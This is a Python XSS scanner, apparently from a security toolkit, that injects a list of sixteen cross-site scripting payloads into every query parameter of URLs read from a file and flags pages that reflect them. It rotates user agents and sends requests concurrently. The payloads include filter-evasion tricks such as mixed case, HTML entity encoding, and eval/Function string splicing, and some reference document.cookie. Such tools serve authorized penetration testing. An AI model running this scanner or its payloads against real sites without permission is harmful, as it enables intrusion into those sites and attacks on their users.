import aiohttp
import asyncio
import urllib.parse
from colorama import init, Fore
from scripts.useragent.user_agent import _useragent_list
import random

init()

rd = Fore.RED
g = Fore.GREEN
reset = Fore.RESET

payloads = [
    "<script>alert('XSS')</script>",
    "<Img Src=OnXSS OnError=confirm(1337)>",
    "<svg/onload=alert('XSS')>",
    '"><svg onload=alert(1)>',
    '" onmouseover="alert(1)" x="',
    '<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">',
    '" autofocus onfocus="alert(document.cookie)" x="',
    "<ScRiPt>alert(1)</ScRiPt>",
    "<svg/onLoAd=alert&#x28;1&#x29>",
    "<img src=x oNeRrOr=prompt(document.domain)>",
    "<svg onload=eval('ale'+'rt(1)')>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "' onmouseover=alert(1) x='",
    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
    "<img src=x onerror=Function('al'+'ert(1)')()>",
]

found_urls = []
sem = asyncio.Semaphore(50)
VALID_STATUS = {200, 201, 202, 301, 302, 307, 308, 400, 401, 403, 422}


async def fetch(session, url, payload):
    random_agent = random.choice(_useragent_list)
    url = url.strip()
    url_parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(url_parsed.query)

    if not qs:
        return

    injected_qs = [(k, payload) for k, _ in qs]
    new_query = urllib.parse.urlencode(injected_qs)
    full_url = urllib.parse.urlunparse(url_parsed._replace(query=new_query))

    headers = {"User-Agent": random_agent}

    async with sem:
        try:
            async with session.get(full_url, headers=headers, timeout=10) as response:
                text = await response.text()
                status = response.status
                if status in VALID_STATUS:
                    if payload in text:
                        print(f"{rd}[POSSIBLE XSS FOUND] {full_url}{reset}")
                        found_urls.append(full_url)
        except Exception:
            pass

async def main(file):
    with open(file, 'r') as f:
        urls = f.readlines()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            if "=" in url:
                for payload in payloads:
                    tasks.append(fetch(session, url, payload))
        await asyncio.gather(*tasks)

    print(f"{g}\nScan complete. XSS Found: {len(found_urls)}{reset}")
    if found_urls:
        with open('xss_evillight.txt', 'w') as f:
            for url in found_urls:
                f.write(url + "\n")